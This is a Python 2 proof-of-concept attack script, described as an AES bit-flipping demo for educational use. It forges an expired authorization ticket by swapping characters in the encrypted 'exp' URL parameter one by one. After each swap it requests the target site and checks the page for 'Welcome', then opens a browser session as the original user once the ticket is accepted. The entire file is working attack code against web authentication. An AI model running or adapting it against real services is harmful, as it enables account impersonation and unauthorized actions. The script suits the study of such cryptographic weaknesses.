#   AES Bit Flipping Attack 
#   Description: Purpose of this script is the proof of concept for the revalidation of a forged expired ticket 
#   in order to get authenticated and perfornm an action as the original user. In this scenario, the ticket that gives the authorization for a change 
#   or a confirmation to a request is a url which has three fields: username, email and validity period. 
#   We perform a bit flip attack to change the validity period field of the url parameter.
#   This demo is done for educational purposes only.
#   Author: Christina Skouloudi
#   Year: 2013

import urllib
import urlparse
import webbrowser
import string
 
charSet = string.ascii_letters + string.punctuation + string.digits #build my alphabet
 
#url = 'http://localhost/?user=xN15ZrEkb4HBsPKQQhUlQ4Mjz5VgEvfLLLBb7FBqGU4=&email=5BqeoBl8mhWWqcO02zF9m5V4It2ispAb9MyiPXOT1jQ=&exp=UXQ2tK5YO0elF9cjVCcww408L71/RDtzRuiaedgW/Dk='
url = raw_input('Give the url:')
 
par = urlparse.parse_qs(urlparse.urlparse(url).query) #parse parameters
 
user = par['user']
email = par['email']
exp = par['exp']
 
user = user[0]  #casting
email =email[0] 
exp = exp[0]    
expOr = exp     #duplicate
 
banana = url.split("?")
baseurl = banana[0]
 
newurl= baseurl + '?user=' + user + '&email=' + email +'&'
 
 
for (i, item) in enumerate(exp):
    success = -1    #init
    for letter in charSet:                  #print letter
        exp = exp[:i] + letter + exp[i+1:]  #exp[i] = letter
        print exp                           #checkpoint2
        params = urllib.urlencode({'exp': exp})
        response = urllib.urlopen(newurl+ "%s" %params)
        payload = response.read()
        #print response.geturl()            # checkpoint3 - the final URL with parameters.
        #print payload                      # checkpoint4 - the html content
        strtofind = "Welcome"               #the magic word
        success = payload.find(strtofind)   #if i am in open browser
        if success >= 0:
            webbrowser.open(newurl+ "%s" %params)
            break
    if success >= 0:
        answer = raw_input('To find yet another valid ticket press Y. To exit press N:')
        if answer == 'N':
            break
        elif answer == 'Y':
            continue
    exp = exp[:i] + expOr[i] + exp[i+1:]    #replace with original and go to next letter
    #checkpoint = raw_input(' ')            #tell bash to wait
